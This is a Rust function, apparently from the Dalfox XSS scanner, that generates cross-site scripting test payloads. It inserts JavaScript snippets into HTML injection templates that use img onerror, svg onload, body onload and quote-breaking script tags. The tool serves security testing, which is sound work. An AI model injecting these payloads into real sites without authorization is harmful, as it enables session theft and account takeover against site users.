/// Dynamically build HTML payloads by combining base templates with JavaScript execution
/// primitives from XSS_JAVASCRIPT_PAYLOADS.
/// This replaces the previous static XSS_HTML_PAYLOADS constant to ensure automatic synchronization
/// when JavaScript payload list changes.
pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
    let templates = [
        "<img src=x onerror={JS} class=dalfox>",
        "<svg onload={JS} class=dalfox>",
        "<body onload={JS} class=dalfox>",
        "'><script class=dalfox>{JS}</script>",
        "\"><script class=dalfox>{JS}</script>",
    ];
    let mut out = Vec::new();
    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
        for tmpl in templates.iter() {
            out.push(tmpl.replace("{JS}", js));
        }
    }
    out
}
